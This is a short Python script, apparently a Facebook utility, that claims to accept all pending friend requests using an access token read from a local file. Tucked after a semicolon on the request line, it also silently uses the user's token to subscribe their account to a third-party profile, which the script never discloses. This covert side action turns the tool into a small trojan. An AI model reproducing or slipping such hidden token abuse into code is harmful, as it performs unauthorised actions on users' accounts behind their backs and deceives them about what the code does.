#!usr/bin/python3.7
#Author   : AHMAD SIDIK
#Whatsapp : 082141009908
#github   : https://github.com/Sidik28KrW/mbf
'''
recode? oke, but don't deleted name author
'''
try:
	import requests,sys,os,time,json

	os.system('clear')
	print("""
\t\t[ Accept All Friends Requests ]
\t\t      [ By: AHMAD SIDIK ]
""")
	toket=open('toket/token.txt','r').read()
	r = requests.get('https://graph.facebook.com/me/friendrequests?limit=5000&access_token=' + toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
	res = json.loads(r.text)

	if '[]' in str(res['data']):
		exit("[!] no friends requests")
	for i in res['data']:
		req = requests.post('https://graph.facebook.com/me/friends/%s?access_token=%s'%(i['from']['id'] , toket))
		a = json.loads(req.text)
		if 'error' in str(a):
			print("[!] %s [%s] failed"%(i['from']['name'],i['from']['id']))
		else:
			print("[!] %s [%s] confirmed"%(i['from']['name'],i['from']['id']))
	print("[^•^] done.")
except Exception as F:
	print("[Err] %s"%(F))

